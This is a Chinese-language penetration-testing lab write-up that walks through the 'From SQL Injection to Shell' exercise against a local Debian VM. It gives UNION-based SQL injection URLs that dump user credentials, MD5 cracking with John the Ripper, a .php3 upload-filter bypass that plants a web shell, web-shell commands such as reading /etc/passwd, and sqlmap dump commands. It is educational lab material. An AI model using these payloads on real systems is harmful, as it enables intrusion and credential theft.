## 从SQL注入到Shell
-------

### 一.实验环境
攻击者： kali系统&nbsp;attack&nbsp;网络&nbsp;NatNetwork &nbsp;10.0.2.9<br>
![](https://i.imgur.com/euES08k.png)<br>
受害者： Debian&nbsp;sql_victim&nbsp;网络&nbsp;NatNetwork&nbsp;10.0.2.8<br>
![](https://i.imgur.com/Lm1HbRY.png)<br>
两者网络互通<br>
![](https://i.imgur.com/AgQsbzt.png)<br>

### 二.实验步骤
- 攻击机扫描受害者端口，确认22与80端口开放<br>
![](https://i.imgur.com/qOEejJT.png)
- 通过使用telnet连接到受害者的80端口，可以检索到大量信息
```
telnet 10.0.2.8 80
```
发送HTTP信息：
```
GET / HTTP/1.1
Host: 10.0.2.8
```
![](https://i.imgur.com/SfHZkoT.png)
- 通过使用软件Burp Suite设置为代理，也可以得到相同的信息
	- 将Burp Suite默认代理拦截关闭
![](https://i.imgur.com/crD9jTG.png)
	- 攻击机浏览器访问受害者的80端口 
![](https://i.imgur.com/AvASBhZ.png)
	- 查看burp suite拦截到的信息
![](https://i.imgur.com/mgn0I2p.png)
- 使用wfuzz暴力检测web服务器上的目录和页面
对于本次实验来说，wfuzz爆破是一个可选步骤。wfuzz 的典型应用场景是：所有可见的链接都已经测试过了，还希望更进一步找找有没有「隐藏」的链接、孤立页面，这个时候 wfuzz 类的 URI 爆破工具就可以派上用场了
![](https://i.imgur.com/EL83coM.png)
	- 运行以下命令来检测远程文件和目录
```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10.0.2.8/FUZZ
```
![](https://i.imgur.com/U3t8zUl.png)
	- 还可用于检测服务器上的PHP脚本
```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10.0.2.8/FUZZ.php
```
![](https://i.imgur.com/zsujKzR.png)

- SQL注入
	- 查看网页源码，发现有3个id值，可以返回三张图片 
![](https://i.imgur.com/SU66Cj6.png)
![](https://i.imgur.com/cSJtC45.png)
当id为3时，应该返回内容，但可能因为该图片已经不存在因此返回空白
![](https://i.imgur.com/R9Ht2mw.png)
	- 当在地址栏输入的id不在1-3范围内时，不返回任何内容
![](https://i.imgur.com/1QUlacj.png)
	- 当在地址栏输入and的两边有一边为真，则返回真条件部分的内容
![](https://i.imgur.com/Dg2P8Z7.png)
	- 当在地址栏输入or的两边有一边为真，则返回全部图片
![](https://i.imgur.com/gFXCl0M.png)
![](https://i.imgur.com/wK0uqan.png)
	- 当在地址栏输入and的两边都为假，则不返回任何内容
![](https://i.imgur.com/GNa9jgg.png)

可见该结果满足理论上and和or的判断条件

- 服务器接受减法运算，加法符号会报错，同时会暴露后台数据库是MYSQL
![](https://i.imgur.com/6acUWST.png)
	- 服务器接受求余运算1%2=1,2%1=0，按照运算结果返回内容
![](https://i.imgur.com/Cv03YMm.png)
	- 服务器接受乘法运算，除法符号会报错
![](https://i.imgur.com/J66fxEQ.png)
	- 括号与单双引号必须成对出现，如果出现奇数个括号或引号则会报错，同时会暴露后台数据库是MYSQL，可以用 -- 注释掉之后的内容
![](https://i.imgur.com/AXPpLzT.png)
![](https://i.imgur.com/ZxYQnLC.png)
	- 被引号引起来的数字会被服务器正确解释并返回，但处理速度通常要慢于直接书写数字
![](https://i.imgur.com/KW5iCXT.png)
由结果可见，整数与字符都可能产生SQL注入
	
- 利用order关键字来探测数据库中的列数，如果ORDER BY语句中的列号大于查询中的列数，则会引发错误；由1开始递增观察到当order 5时返回未知列数错误，确定列数为4
![](https://i.imgur.com/fBsaNso.png)
	- 利用UNION SELECT来确定列数，如果尝试执行UNION并且两个查询返回的列数不同，则注入返回错误；通过该过程猜测并确定列数为4
![](https://i.imgur.com/RIS1V9I.png)
	- 通过UNION SELECT返回的信息2我们知道，数据库用第二列来输出信息，因此我们通过替换第二列的值来探测数据库的相关信息
```
数据库版本：http://10.0.2.8/cat.php?id=1％20UNION％20SELECT％201,@@ version,3,4
当前用户：http://10.0.2.8/cat.php?id=1％20UNION％20SELECT％201,current_user(),3,4
当前数据库：http://10.0.2.8/cat.php?id=1％20UNION％20SELECT％201,database(),3,4
```
![](https://i.imgur.com/9XS75EC.png)
![](https://i.imgur.com/TwrknFB.png)
	
- MySQL提供的表包含自MySQL版本5以来可用的数据库，表和列的元信息。我们将使用这些表来检索构建最终请求所需的信息。这些表存储在数据库information_schema中。
```
表格列表： http://10.0.2.8/cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
列列表： http://10.0.2.8/cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns
```
![](https://i.imgur.com/Bv42T7Z.png)
	- 这些请求提供了所有表和列的原始列表，但是要查询数据库并检索有用的信息，需要知道哪个列属于哪个表。
```
使用关键字CONCAT：
在注入的同一部分中连接表名和列名:http://10.0.2.8/cat.php?id=1 UNION SELECT 1,concat('^^^',table_name,':',column_name,'^^^'),3,4 FROM information_schema.columns
```
	
- 我们获悉想要的用户名和密码信息在user表中，于是用如下查询得到需要的信息
```
http://10.0.2.8/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;
```
![](https://i.imgur.com/umEXIOj.png)

- 分析用户名和密码
	- 方法一：使用搜索引擎。当哈希是未加盐的时候，可以使用Google这样的搜索引擎轻松破解，可以由网页搜索结果得知该网站使用的是MD5加密算法，且直接可以得到解密后的密码明文
![](https://i.imgur.com/qW86k6X.png)
	- 方法二：John-The-Ripper可用于破解此密码，大多数现代Linux发行版都包含John的版本，为了破解此密码，您需要告诉John使用了哪种算法来加密它。对于Web应用程序，一个很好的猜测是MD5。
	1. 找到/usr/share/wordlists文件夹中的rockyou.txt.gz并提取其中的txt文件，作为john解密的参考字典
	2. 创建pwd.txt并将用户名和密码密文存入其中，作为john解密的文本;我们要为John提供正确格式的信息，将用户名和密码放在由冒号'：'分隔的同一行上<br>admin:8efe310f9ab3efeae8d410a8e0166eb2
	3. 在命令行输入如下指令，提取密码明文
```
john pwd.txt --format = raw-md5 --wordlist = rockyou.txt --rules
```
![](https://i.imgur.com/q5OgjdG.png)
![](https://i.imgur.com/VeCoJrL.png)

- 随后用获取到的用户名和密码明文登录管理员 
![](https://i.imgur.com/elsQ7Pj.png)

- 上传webshell和代码执行
<br>我们可以看到有一个允许用户上传图片的文件上传功能，我们可以使用此功能尝试上传PHP脚本。一旦上传到服务器上，这个PHP脚本将为我们提供运行PHP代码和命令的方法。

	- 首先，我们需要创建一个PHP脚本来运行命令。保存为扩展名为.php的文件
![](https://i.imgur.com/n1Wbgl6.png)
	- 我们现在可以使用页面上提供的上传功能并尝试上传此脚本
![](https://i.imgur.com/2LmbF62.png)
	- 我们可以看到该脚本尚未在服务器上正确上载。应用程序阻止具有.php要上载扩展名的文件。
![](https://i.imgur.com/s42kX5J.png)
	- 但是我们可以尝试将后缀名改为php3来绕过这一过滤器，文件上传成功，.php3 能被当作 PHP 文件解释执行，是因为目标 Apache 服务器配置缺陷
![](https://i.imgur.com/5ecuvhk.png)
![](https://i.imgur.com/sMQQc0C.png)
	- 查看网页源码,并直接访问/show.php?id=4，并进一步访问admin/uploads/shell.php3
![](https://i.imgur.com/JvMdmqP.png)
![](https://i.imgur.com/UmUY35e.png)
![](https://i.imgur.com/QoDywIe.png)
	- 利用url执行cmd命令获取服务器信息
	1. 获取服务器内核信息<br>
	```http://10.0.2.8/admin/uploads/shell.php3?cmd=uname```
	![](https://i.imgur.com/LFhe5Uk.png)
	2. 获取系统用户完整列表<br>
	```http://10.0.2.8/admin/uploads/shell.php3?cmd=cat /etc/passwd```
	![](https://i.imgur.com/muNyDct.png)
	3.  获取当前内核的版本<br>
	```http://10.0.2.8/admin/uploads/shell.php3?cmd=uname -a```
	![](https://i.imgur.com/IpizLZM.png)
	4. 获取当前目录的内容<br>
	```http://10.0.2.8/admin/uploads/shell.php3?cmd=ls``` 
	![](https://i.imgur.com/eHaZJGN.png)

- 使用SQLmap自动注入
	- 找到sql注入点及服务器信息
![](https://i.imgur.com/q8efbOz.png)
	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" --dbs```
![](https://i.imgur.com/A5OQdwd.png)
	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" --tables```<br>
![](https://i.imgur.com/uBPxAeY.png)
![](https://i.imgur.com/ma1iU5o.png)
	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" -T users --columns```<br>
![](https://i.imgur.com/zvoRa0U.png)
	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" -T users -C "login,password" --dump```
![](https://i.imgur.com/5e1TLvS.png)

## 参考
------

 [SQL注入常见攻击方式](https://blog.csdn.net/github_36032947/article/details/78442189)<br>
 [Kali下使用SQLmap工具对网站进行渗透测试检测](https://www.exehack.net/4955.html)<br>
 [From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/course)